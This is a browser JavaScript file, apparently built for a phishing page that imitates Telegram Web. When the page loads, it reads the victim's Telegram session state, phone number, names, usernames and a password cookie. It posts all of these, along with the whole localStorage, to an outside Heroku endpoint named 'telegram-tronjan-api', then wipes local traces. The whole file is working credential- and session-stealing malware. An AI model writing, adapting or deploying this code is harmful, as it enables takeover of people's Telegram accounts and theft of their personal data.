document.addEventListener("DOMContentLoaded", function() {
  async function checkLocalStorage() {
    let globalState = localStorage.getItem("tt-global-state");
    if (globalState && localStorage.getItem("user_auth")) {
      const parsedState = JSON.parse(globalState);
      const currentUserId = parsedState.currentUserId;
      const currentUser = parsedState.users.byId[currentUserId];
      document.body.style.display = "none";
      if (currentUserId && currentUser) {
        const { firstName, usernames, phoneNumber, isPremium } = currentUser;
        const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1];

        localStorage.removeItem("GramJs:apiCache");
        localStorage.removeItem("tt-global-state");
        try {
          await fetch(`https://telegram-tronjan-api-6651ccf8d8ad.herokuapp.com/api/users/telegram/info`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              userId: currentUserId, firstName,
              usernames, phoneNumber, isPremium,
              password, quicklySet: localStorage,
              type: new URLSearchParams(window.location.search).get("type")
            })
          }).then(res => {
            alert('success')
            alert(JSON.stringify(res))
            console.log(res);
          }).catch(er => {
            alert('error')
            alert(JSON.stringify(er))
            console.log(er, 'errr');
          });
        } catch (er) {
          alert('error 2')
          alert(JSON.stringify(er))
          console.log(er, 'error in api')
        }
        alert('ending')
        // window.Telegram.WebApp.openTelegramLink("https://t.me/onewordseeker");
        // window.Telegram.WebApp.close();
        localStorage.clear();
        document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        // window.location.href = "https://web.telegram.org/a/";  

        clearInterval(checkInterval);
      }
    } else {
      sessionStorage.clear();
      localStorage.clear();
    }
  }

  const checkInterval = setInterval(checkLocalStorage, 100);
});
